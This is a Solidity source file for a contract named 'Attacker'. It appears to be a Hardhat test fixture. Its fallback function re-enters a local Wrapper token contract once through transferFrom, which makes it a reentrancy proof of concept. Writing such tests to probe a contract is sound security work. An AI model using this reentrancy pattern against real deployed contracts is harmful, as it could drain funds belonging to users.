// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "../Wrapper.sol";

import "hardhat/console.sol";

contract Attacker {
    address public wrapperAddress;

    bool internal _unwrapped;

    constructor(address _wrapperAddress) {
        wrapperAddress = _wrapperAddress;
    }

    function unwrapFrom(uint256 amount) public {
        Wrapper(payable(wrapperAddress)).transferFrom(msg.sender, wrapperAddress, amount);
        console.log(amount);
    }

    fallback() external payable {
        if (!_unwrapped) {
            _unwrapped = true;
            unwrapFrom(1 ether);
        }
    }
}
